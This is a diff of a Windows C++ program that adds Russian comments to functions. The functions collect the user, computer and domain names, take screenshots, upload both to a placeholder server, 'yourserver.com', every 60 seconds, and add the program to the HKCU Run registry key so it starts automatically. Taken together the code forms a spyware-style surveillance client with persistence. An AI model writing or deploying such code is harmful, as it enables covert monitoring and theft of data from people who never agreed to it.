@@ -11,6 +11,7 @@
 
 using namespace Gdiplus;
 
+// Получение имени пользователя
 std::string getUserName() {
     char username[UNLEN + 1];
     DWORD username_len = UNLEN + 1;
@@ -18,6 +19,7 @@ std::string getUserName() {
     return std::string(username);
 }
 
+// Получение имени компьютера
 std::string getComputerName() {
     char computerName[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
@@ -25,6 +27,7 @@ std::string getComputerName() {
     return std::string(computerName);
 }
 
+// Получение доменного имени
 std::string getDomainName() {
     char domainName[DNLEN + 1];
     DWORD domainName_len = DNLEN + 1;
@@ -32,6 +35,7 @@ std::string getDomainName() {
     return std::string(domainName);
 }
 
+// Отправка данных активности на сервер
 void sendActivityData(const std::string& serverUrl) {
     HINTERNET hSession = InternetOpen("ActivityMonitor", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hSession) {
@@ -75,6 +79,7 @@ void sendActivityData(const std::string& serverUrl) {
     InternetCloseHandle(hSession);
 }
 
+// Захват скриншота экрана
 bool captureScreenshot(const std::string& fileName) {
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
@@ -106,6 +111,7 @@ bool captureScreenshot(const std::string& fileName) {
     return status == Ok;
 }
 
+// Отправка скриншота на сервер
 void sendScreenshot(const std::string& serverUrl) {
     std::string fileName = "screenshot.jpg";
     if (captureScreenshot(fileName)) {
@@ -158,6 +164,7 @@ void sendScreenshot(const std::string& serverUrl) {
     }
 }
 
+// Добавление клиента в автозапуск
 void addToStartup() {
     HKEY hKey;
     LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
@@ -175,7 +182,7 @@ int main() {
     while (true) {
         sendActivityData("http://yourserver.com");
         sendScreenshot("http://yourserver.com");
-        Sleep(60000); // отправлять данные каждые 60 секунд
+        Sleep(60000); // Отправлять данные каждые 60 секунд
     }
     return 0;
 }
